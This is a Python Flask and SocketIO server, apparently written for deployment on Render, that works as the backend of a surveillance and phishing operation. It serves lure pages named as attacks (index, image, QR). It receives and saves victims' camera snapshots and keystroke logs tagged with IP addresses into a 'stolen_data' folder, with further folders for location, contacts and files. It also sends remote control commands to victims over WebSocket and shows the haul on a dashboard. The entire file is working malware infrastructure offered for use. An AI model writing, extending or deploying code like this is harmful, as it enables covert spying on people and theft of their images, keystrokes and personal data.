#!/usr/bin/env python3
import os
import json
import base64
from datetime import datetime
from flask import Flask, request, jsonify, render_template, send_file
from flask_socketio import SocketIO
import logging

# إعداد التطبيق
app = Flask(__name__)
app.config['SECRET_KEY'] = 'cairopy_sec_2024'

# استخدام gevent لضمان التوافق مع Render
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='gevent')

# إعداد المسارات المطلقة للمجلدات لضمان عملها على Linux
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
STOLEN_DIR = os.path.join(BASE_DIR, "stolen_data")

folders = ['camera', 'keys', 'location', 'contacts', 'files']
for folder in folders:
    os.makedirs(os.path.join(STOLEN_DIR, folder), exist_ok=True)

VICTIM_IP = "Unknown"

@app.route('/')
def index_attack(): return render_template('index.html')

@app.route('/image')
def image_attack(): return render_template('image.html')

@app.route('/qr')
def qr_attack(): return render_template('qr.html')

@app.route('/api/camera', methods=['POST'])
def receive_camera():
    data = request.json
    v_id = data.get('victim_id', 'unknown')
    p_type = data.get('type', 'front')
    img_data = data.get('image', '')
    if img_data:
        filename = f"{v_id}_{p_type}_{datetime.now().strftime('%H%M%S')}.jpg"
        path = os.path.join(STOLEN_DIR, 'camera', filename)
        with open(path, 'wb') as f:
            f.write(base64.b64decode(img_data.split(',')[1] if ',' in img_data else img_data))
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"}), 400

@app.route('/api/keylog', methods=['POST'])
def receive_keylog():
    data = request.json
    ip = request.remote_addr
    log = {'ip': ip, 'time': datetime.now().isoformat(), 'keys': data.get('keys', ''), 'url': data.get('url', '')}
    path = os.path.join(STOLEN_DIR, 'keys', f"log_{ip.replace('.','_')}.txt")
    with open(path, 'a', encoding='utf-8') as f:
        f.write(json.dumps(log) + '\n')
    return jsonify({"status": "ok"})

@app.route('/api/control', methods=['POST'])
def control_victim():
    data = request.json
    action = data.get('action')
    socketio.emit('control', data) # إرسال الأمر مباشرة للضحية عبر WebSocket
    return jsonify({"status": "sent"})

@app.route('/dashboard')
def dashboard():
    files_map = {f: os.listdir(os.path.join(STOLEN_DIR, f)) for f in folders}
    return render_template('dashboard.html', files=files_map, victim_ip=VICTIM_IP)

@app.route('/stolen/<category>/<filename>')
def serve_stolen(category, filename):
    return send_file(os.path.join(STOLEN_DIR, category, filename))

if __name__ == '__main__':
    # ملاحظة: في Render سيتم تجاهل هذا الجزء واستخدام أمر gunicorn
    port = int(os.environ.get("PORT", 5000))
    socketio.run(app, host='0.0.0.0', port=port)
